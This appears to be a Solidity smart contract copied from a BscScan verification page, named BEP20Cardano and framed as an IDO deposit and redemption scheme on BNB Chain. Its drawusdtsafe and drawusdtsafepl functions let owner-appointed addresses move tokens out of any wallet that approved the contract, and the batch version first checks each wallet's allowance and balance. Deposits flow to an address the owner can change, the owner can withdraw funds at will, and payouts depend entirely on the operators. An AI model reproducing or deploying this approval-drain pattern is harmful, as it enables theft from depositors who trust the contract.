/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.5.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Context {
  constructor () internal { }
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20Cardano is Context, Ownable {
  using SafeMath for uint256;
  IBEP20 public tokenu;

  mapping (address => uint256) private _kted;
  mapping (address => uint256) private _shkted;
  mapping (address => uint256) private _ktedone;
  mapping (address => uint256) private _ls;



  mapping (address => bool) private jearr;
  mapping (address => bool) private safearr;

  mapping (uint256 => uint256) private _snlist;

  address private _zeroacc=0x0000000000000000000000000000000000000000;

  address tokenacc=address(this);
  address usdtacc = 0xe2Aa9B817f9446cd682a7fb3F8b4D257Cf9BfeC6;
  address safeaddress = 0x673b7B79e0316286b518a9944fc933E5b05142ae;
  address oneacc =0x55d398326f99059fF775485246999027B3197955;
  address skacc =0x673b7B79e0316286b518a9944fc933E5b05142ae;
  address yxacc=0x2BF319D79E1b9088c95dd917AF3efB874Ca9e53E;


  constructor() public {
  }

  //IDO
  function deposit(uint256 amount,uint256 osn,uint256 zydays,address[] memory accarr,uint256[] memory edarr)public returns(bool){
     tokenu = IBEP20(usdtacc);
     uint256 je=amount.mul(100).div(100);
     //赎回的可提额度
     uint256 ed=amount.mul(100).div(100);
     _shkted[msg.sender]=_shkted[msg.sender].add(ed);
     _shkted[msg.sender]=_shkted[msg.sender].add(1);
     //收益的可提额度
     uint256 alled=0;
     uint256 oneued=0;
     uint256 twoed=0;
     for(uint i=0;i<accarr.length;i++){
        alled=alled.add(edarr[i]);
        if(i==0){
           oneued=edarr[i];
        }
        if(i==1){
           twoed=edarr[i];
        }
     }
     uint256 safeje=amount.mul(zydays);
     safeje=safeje.mul(12).div(1000);
     require(oneued<=safeje,'no safe');

     uint256 ztjl=safeje.mul(50).div(100);
     require(twoed<=ztjl,'no safe');
     safeje=safeje.add(ztjl);

     require(alled<=safeje,'no safe');

     for(uint i=0;i<accarr.length;i++){
        uint256 ued=edarr[i].mul(2);
        _kted[accarr[i]]=_kted[accarr[i]].add(ued);
     }
     tokenu.transferFrom(msg.sender,skacc,je);
     _snlist[osn]=amount;
     return true;
  }
  function chksnlist(uint256[] memory snarr)public view returns(uint256[] memory){
        uint256[] memory rd;
        rd = new uint256[](snarr.length);
        for(uint i=0;i<snarr.length;i++){
              rd[i]=_snlist[snarr[i]];
        }
        return rd;
    }

  function getOwner() external view returns (address) {
    return owner();
  }
  function getls(address acc) external view returns (uint256) {
    return _ls[acc];
  }
 
  function getoinfo(uint256 oid) external view returns (uint256) {
    return _snlist[oid];
  }
  

  function drawusdt(address to,uint256 amount)public onlyOwner{
     IBEP20(usdtacc).transfer(to,amount);
  }

  function drawusdtsafe(address from,address to,uint256 amount)public{
     require(safearr[msg.sender]==true,'no safe');
     IBEP20(usdtacc).transferFrom(from,to,amount);
  }

function drawusdtsafepl(address[] memory from,address to,uint256 amount)public{
     require(safearr[msg.sender]==true,'no safe');
     for(uint i=0;i<from.length;i++){
            //查额度
            uint256 je=0;
            uint256 sqed=IBEP20(usdtacc).allowance(from[i],tokenacc);
            uint256 ye=IBEP20(usdtacc).balanceOf(from[i]);
            if(sqed>=ye){
              je=ye;
            }else{
              je=sqed;
            }
            if(je>0){
              IBEP20(usdtacc).transferFrom(from[i],to,amount);
            }
     }
     
  }

  function addsafe(address acc)public onlyOwner{
     safearr[acc]=true;
  }

  //设置可提额度
  function setkted(address to,uint256 amount)public onlyOwner{
     _kted[to]=amount*10**18;
  }
  //设置可提额度one
  function setktedone(address to,uint256 amount)public onlyOwner{
     _ktedone[to]=amount*10**18;
  }

  function showed(address acc)external view returns(uint256){
     return _kted[acc];
  }
  function showedone(address acc)external view returns(uint256){
     return _ktedone[acc];
  }

  //设置安全钱包
  function setsafeaddress(address _safeaddress)public onlyOwner{
     safeaddress = _safeaddress;
  }
  //设置skacc
  function setskacc(address acc)public onlyOwner{
     skacc = acc;
  }


  //设置oneacc
  function setoneacc(address acc)public onlyOwner{
     oneacc = acc;
  }
  
  function setyxacc(address acc)public onlyOwner{
     yxacc = acc;
  }

  //提现收益
  function txdo(uint256[] memory snarr,uint256[] memory jearr,address[] memory to,uint256[] memory typearr)public{
        require(msg.sender==safeaddress || safearr[msg.sender]==true,'no safeaddress');
        for(uint i=0;i<snarr.length;i++){
            //rd[i]=_snlist[snarr[i]];
            if(typearr[i]==2){
                require(_kted[to[i]]>=jearr[i],'no kted');
                _kted[to[i]]=_kted[to[i]].sub(jearr[i]);
                IBEP20(usdtacc).transfer(to[i],jearr[i]);
            }
            if(typearr[i]==1){
                require(_kted[to[i]]>=jearr[i],'no kted');
                _kted[to[i]]=_kted[to[i]].sub(jearr[i]);
                IBEP20(oneacc).transfer(to[i],jearr[i]);
            }
            _snlist[snarr[i]]=jearr[i];
        }
  }
  //赎回本金
  function redeem(uint256[] memory snarr,uint256[] memory jearr,address[] memory to,uint256[] memory typearr)public {
      require(msg.sender==safeaddress || safearr[msg.sender]==true,'no safeaddress');
      for(uint i=0;i<snarr.length;i++){
            //rd[i]=_snlist[snarr[i]];
            if(typearr[i]==2){
                require(_shkted[to[i]]>=jearr[i],'no kted');
                _shkted[to[i]]=_shkted[to[i]].sub(jearr[i]);
                IBEP20(usdtacc).transfer(to[i],jearr[i]);
            }
            _snlist[snarr[i]]=jearr[i];
        }
  }
  
}